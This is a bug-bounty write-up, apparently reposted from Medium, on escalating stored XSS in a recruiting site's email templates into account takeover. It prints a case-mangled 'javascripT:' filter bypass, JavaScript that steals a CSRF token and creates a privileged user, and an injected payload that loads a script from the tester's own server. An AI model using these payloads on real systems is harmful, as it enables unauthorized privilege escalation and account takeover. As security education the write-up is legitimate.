# Day 2

- **Source URL:** https://medium.com/@danielbelay/day-2-account-takeover-via-stored-xss-ac62c49b20c1?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251124181132/https://medium.com/@danielbelay/day-2-account-takeover-via-stored-xss-ac62c49b20c1
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8709 (id 8709)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Day 2: Account Takeover via Stored XSS

## Introduction

This write-up details how discovered a Stored Cross-Site Scripting (XSS) vulnerability on a recruiting website and escalated it to achieve account takeover. The platform had different roles such as Admin, Manager, and Staff. The website allowed users to send emails and manage templates for communication. Exploiting a Stored XSS vulnerability within the template system, and managed to execute malicious JavaScript and escalate privileges

## Discovery of Stored XSS

While exploring the “Templates” section of the website, noticed that users could create email templates containing text and links. This feature allowed users to save time by reusing pre-written templates.

- **Template Structure**:
- **Title Field:** Used for naming the template.
- **Body Field:** Allowed users to enter text and insert hyperlinks.

Initially, attempted to inject `javascript:alert(1)`, but the application rejected it as invalid syntax. experimented with different variations and found that `javascripT:alert(1)` was accepted as a link, though clicking it did not trigger an alert immediately. The payload was embedded within an `<a>` tag but failed to execute

## Bypassing the Filter

The platform had an “Echo Back” feature that displayed sent emails in the Activity section. When inserted XSS payload into a template and sent an email, the payload was reflected back in the Activity section. Clicking on the payload **successfully triggered an alert**, confirming the XSS execution.

Additionally, found an interesting behavior: If wrote text in the template body, selected it, and then inserted XSS payload as a link, the payload would be hidden within the text, making it harder to detect.

## Escalating XSS to Account Takeover

Since the website had **HttpOnly session cookies**, stealing session cookies was not an option. Instead, focused on **CSRF token theft** to bypass CSRF protection and escalate privileges.

## Plan to Exploit CSRF Tokens

1. Steal **Manager’s CSRF token** using the XSS payload.
2. Use the stolen token to **create a new user** with **Manager privileges**.

At the time, Admin account was locked, so targeted a manager account since Managers had permission to add new users with Manager privileges. worked with a friend proficient in JavaScript and developed an exploit to automate the attack.

## Exploit Code

The exploit first steals the CSRF token from the Manager’s session and then submits a request to create a new Manager account.

## Step 1: Stealing CSRF Token

function readBody(xhr) {

var data;

if (!xhr.responseType || xhr.responseType === “text”) {

data = xhr.responseText;

} else if (xhr.responseType === “document”) {

data = xhr.responseXML;

} else {

data = xhr.response;

}

var parser = new DOMParser();

var resp = parser.parseFromString(data, “text/html”);

token = resp.getElementsByName(‘\_csrf’)\[0\].content; // Extract first available CSRF token

csrf(token);

return data;

}

var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {

if (xhr.readyState == 4) {

response = readBody(xhr);

}

}

xhr.open(‘GET’, ‘[https://target.com/admin/add'](https://target.com/admin/add'), true);

xhr.send(null);


## Step 2: Using CSRF Token to Create a New Manager User

function csrf(token) {

fetch(‘[https://target.com/api/add.action'](https://target.com/api/add.action'), {

method: ‘POST’,

headers: {

‘Content-Length’: ‘346’,

‘Accept’: ‘application/json, text/plain, \*/\*’,

‘X-Csrf-Token’: token,

‘Sec-Ch-Ua-Mobile’: ‘?0’,

‘Content-Type’: ‘application/x-www-form-urlencoded;charset=UTF-8’,

‘Sec-Fetch-Site’: ‘same-origin’,

‘Sec-Fetch-Mode’: ‘cors’,

‘Sec-Fetch-Dest’: ‘empty’,

‘Referer’: ‘[https://target.com/admin/add’](https://target.com/admin/add'),

‘Accept-Encoding’: ‘gzip, deflate’,

‘Accept-Language’: ‘en-US,en;q=0.9’,

‘Connection': ‘close’

},

credentials: ‘include’,

body: ‘firstName=hacker&lastName=r29k&emailId=r29k%40gmail.com&phoneNo=&Permissions=1’

});

}


## Deploying the Attack

To execute the attack, needed to host the exploit on server and inject it via the XSS payload. The final payload injected into the template was:

javascripT:var s = document.createElement(‘script’);s.type = ‘text/javascript’;s.src = ‘[https://myserver/file.js';document.head.appendChild(s);](<https://myserver/file.js';document.head.appendChild(s);>)


Since high-privilege users could see the “Echo Back” emails, when a **Manager clicked** the XSS payload, the exploit executed, **creating a new Manager account**.

Later, when **Admin account was unlocked**, repeated the attack and successfully added a **new Admin user**, achieving full account takeover.

## Impact and Bounty Reward

After demonstrating the exploit, reported the vulnerability to the security team. A few days later, Hunter received a response confirming the issue and was awarded a **$1,000 bounty**.

## Conclusion

This case demonstrates how **Stored XSS can be escalated to privilege escalation** using CSRF token theft. Some key takeaways:

- **Don’t stop at finding XSS; always look for escalation opportunities.**
- **CSRF token theft is a powerful technique to bypass CSRF protection.**
- **Encoding and obfuscating XSS payloads can help bypass filtering mechanisms.**
- **Always report such vulnerabilities responsibly to security teams.**

By thinking beyond simple XSS alerts, was able to escalate the vulnerability into a **critical security issue** that led to an account takeover
